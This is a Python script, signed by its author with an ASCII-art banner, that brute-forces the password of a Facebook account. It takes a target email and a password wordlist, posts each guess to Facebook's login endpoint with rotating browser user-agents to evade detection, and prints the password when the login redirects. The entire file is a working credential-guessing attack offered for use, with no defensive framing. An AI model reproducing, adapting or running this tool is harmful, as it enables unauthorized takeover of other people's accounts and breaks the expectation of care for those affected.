#!/usr/bin/python
# coding=utf-8
#   Iraq win
# Living : Nassiriya, Iraq
# Instagram.313.JS
# www.fb.313.MNTZER
#Coded by MNTZER A.ANWER
#

import requests as r
from termcolor import colored
import random
import time as t

print '''
        ~o88ooooooooooooo88o~
   ouooooo,~oo         oo~,ooooouo
   8     ~88888.     ,88888~     8
   8      go~~~os   go~~~os      8
   8    ,8`     '8_8`     '8.    8
   8    8`   _   '8`   _   '8    8
   8    8   !@!   8   !@!   8    8
   8    8i       /8\       i8    8
   8     8s     g8 8s     s8     8
   8      dooooo`8_8'ooooob      8
   8     d!      'V`      !b     8
   8     8        ~        8     8
   8     8                 8     8	
   8   ] 8                 8 [   8 
   8 [ ] 8                 8 [ ] 8
   8 [ ] !8               8| [ ] 8
   8 [ ]s88b-oo- xxx -oo-d88s[ ] 8
   8 [,88  8i'`   ~   '`i8  88.] 8
   8 88`   88s'88` '88`gf8   '88 8
   888   ,g8s/8. ooo ,8\g8s.   888
   88`  i888888fo_X_of888888i  '88
   V    YY'`~'`  ~~~  '` ~ YY    V
        ""                 ""
 
By : MNTZER A. ANWER
------------------------------------
\n\n  '''

url = 'https://www.facebook.com/login.php'
login = str(raw_input("\n\t Mntzer A.ANWER\n[+] Enter Your email: ")) 
def list():
   global wordlist
   wordlist =  str(raw_input("\t Mntzer A.ANWER\n[+] Enter password list : "))
   try:
     global  passw 
     passw = open(wordlist,'r').readlines()
   except FileNotFoundError:
       print('File not found, try again')
       list()
list()

try:
    passw = open(wordlist,'r').readlines()
except FileNotFoundError:
    print('File not found, try again')
    list()

agents = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.3',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1'
]

headers = {'Cookie':'locale=es_LA'}                                                                 
headers['User-Agent'] = random.choice(agents) 
headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
headers['Content-type'] = "application/x-www-form-urlencoded"
headers['Accept-Charset'] = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
s = r.Session()
print('Start cracking...')

for line in passw:
    t.sleep(0.5)
    pwd = line.strip()
    usr_data = {}
    usr_data['email'] = login
    usr_data['pass'] =  pwd
    usr_data['login'] = 'Entrar'
    usr_data['timezone'] = 360
    usr_data['return_session'] = 0
    usr_data['session_key_only'] = 0
    usr_data['legacy_return'] = 1
    usr_data['trynum'] = 1
    usr_data['display'] = ''
    usr_data['persistent'] = 1
    usr_data['default_persistent'] = 1
    usr_data['ajax'] = 'ajax'
     
    s = r.Session()
    res = s.post(url, data=usr_data, headers=headers)
    if res.url != "https://www.facebook.com/login.php":
        print ("\n\n [+]\t\t Iraq win\n\n[+] Programmer: Mntzer A. ANWER\n\n [+] Password is = " + pwd )
        break
    else:
        print ("[-] Ya ALi : " + pwd)
        headers['User-Agent'] = random.choice(agents)

